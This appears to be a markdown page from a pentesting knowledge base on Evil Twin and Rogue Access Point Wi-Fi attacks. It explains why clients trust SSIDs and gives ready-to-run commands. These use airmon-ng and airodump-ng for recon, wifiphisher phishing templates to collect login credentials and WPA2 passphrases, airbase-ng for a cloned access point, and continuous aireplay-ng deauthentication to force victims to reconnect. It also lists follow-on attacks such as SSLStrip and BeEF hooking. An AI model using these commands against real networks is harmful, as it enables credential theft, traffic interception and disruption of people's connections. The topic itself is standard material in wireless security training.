# Evil Twin / Rogue AP

## The main idea behind Evil Twin attack is that the user (victim) trusts a network name, not the radio behind it. We just broadcast the same SSID and SecType louder than real AP, and the device will simply reconnect to us.

There's 2 main tactics behind it

- Karma / Known Beacons - we don't clone anything specific, just answer to whatever SSIDs already saved on the victim's device, so they connect to us without us knowing target network.

- Classic Evil Twin - we clone one specific network, already knowing SSID (Same name, same channel) which pushes the victim to connect to us, after a couple of deauth requests


## So how it all works

We all know that Wi-Fi usees 802.11 protocol. And it has no "Real" identity check. Device just pics a network by SSID ( + SecType), not BSSID or any other creds. So nothing stops two access points from answering to the same name.

So the main idea behind the attack is just - Be the strongest signal when the client is looking for the connection

And when the victim is on your network - go for it.

MiTM / sniffing / phishing page 

<img width="920" height="560" alt="evil-twin-topology" src="https://github.com/user-attachments/assets/8850ba4d-c85f-4637-a0be-f38ac0ed901a" />

## Prep & Recon

### YOU NEED MONITOR MODE CAPABLE ADAPTER

``` bash
sudo airmon-ng check kill      # optional
sudo airmon-ng start wlan0
sudo aireplay-ng --test wlan0  # Check if you can do anything with your adapter
sudo airodump-ng wlan0         # write down ESSID, BSSID, channel, and encryption type
```

### Now it's only matter of building the Twin AP

``` bash
sudo wifiphisher --essid "<TargetSSID>" -p oauth-login    # or -p firmware-upgrade, plugin_update, wifi-connect
```
Now you may add `-kB` to broadcast Known Beacons (SSID around)
or `-p wifi-connect` just to collect WPA2 passphrases

### Matching WPA2-PSK twin for handshake capture
``` bash
sudo airbase-ng -a <AP_MAC> --essid "<TargetSSID>" -c <CH> wlan0
```
if you wanna go wider - use `hostapd-mana` to answer several saved SSIDs (Karma)

### TIP - you may force victim's to reconnect, to speed-up the process

```bash
sudo aireplay-ng -0 0 -a <AP_MAC> wlan0   # 0 = deauth constantly
```

## May be combined with
- MiTM
- DNS Spoofing & Cache Poisoning
- SSLStrip
- Harvesting / EvilTrust
- HTTP Response Injection
- JS BeEF Hooking
- WPAD hijacking
- [LLMNR Poisoning](LLMNR%20poisoning.md)

